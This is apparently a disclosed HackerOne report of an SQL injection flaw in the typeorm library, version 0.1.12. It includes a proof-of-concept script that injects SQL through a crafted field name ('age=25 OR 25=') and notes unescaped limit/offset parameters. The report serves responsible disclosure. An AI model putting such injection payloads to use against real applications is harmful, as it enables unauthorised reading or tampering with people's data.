# typeorm does not properly escape parameters when building SQL queries, resulting in potential SQLi

## Report Details
- **Report ID**: 319458
- **URL**: https://hackerone.com/reports/319458
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-02-25T04:06:39.828Z
- **Disclosed**: 2019-04-03T20:27:32.311Z

## Reporter
- **Username**: chalker
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report an SQLi in typeorm.

It allows to insert potentially user-controlled content into the queries without proper escaping, in cases where that is not verified additionally in the applications that are using typeorm library.

## Module

**module name:** typeorm
**version:** 0.1.12
**npm page:** `https://www.npmjs.com/package/typeorm`

### Description

> TypeORM is an ORM that can run in NodeJS, Browser, Cordova, PhoneGap and Ionic platforms and can be used with TypeScript and JavaScript (ES5, ES6, ES7). Its goal to always support latest JavaScript features and provide features that help you to develop any kind of applications that use databases - from small applications with a few tables to large scale enterprise applications with multiple databases.

### Module Stats

583 downloads in the last day
19 143 downloads in the last week
68 193 downloads in the last month

~818316 estimated downloads per year

## Description

typeorm constructs SQL queries from structured input, and the problem is that it doesn't do proper escaping of field names and limit/offset parameters, so in setups where those are user-controlled that can cause an SQL injection vulnerability.

## Steps To Reproduce:

`typeorm init --name typeormtest --database sqlite`

Use the following code to reproduce:

```js
import "reflect-metadata";
import {createConnection} from "typeorm";
import {User} from "./entity/User";

createConnection().then(async connection => {
    console.log("Inserting a new user into the database...");
    const user = new User();
    user.firstName = "Timber";
    user.lastName = "Saw";
    user.age = 25;
    await connection.manager.save(user);
    console.log("Saved a new user with id: " + user.id);

    const repository = connection.getRepository(User);

    // SQLi on field names
    const where = { firstName: "Jim" };
    const opts = { where: where };
    where["age=25 OR 25="] = 25;

    // SQLi on limit/offset:
    //opts["skip"] = "OLOLO";
    //opts["take"] = "LOLOL";

    const res = await repository.find(opts);
    console.log(res);
}).catch(error => console.log(error));
```

The code is mostly taken from the standard `typeorm` example, only lines from `const repository` to `console.log(res)` were added.

## Supporting Material/References:

- Arch Linux Current
- Node.js 9.5.0
- npm 5.6.0
- sqlite3@3.1.13

## Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

## Impact

SQL injection.
See https://www.owasp.org/index.php/SQL_Injection

The hacker selected the **SQL Injection** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**Verified**
Yes

**What exploitation technique did you utilize?**
Classic / In-Band

**Please describe the results of your verification attempt.**
Observed executed query.



## Attachments
No attachments
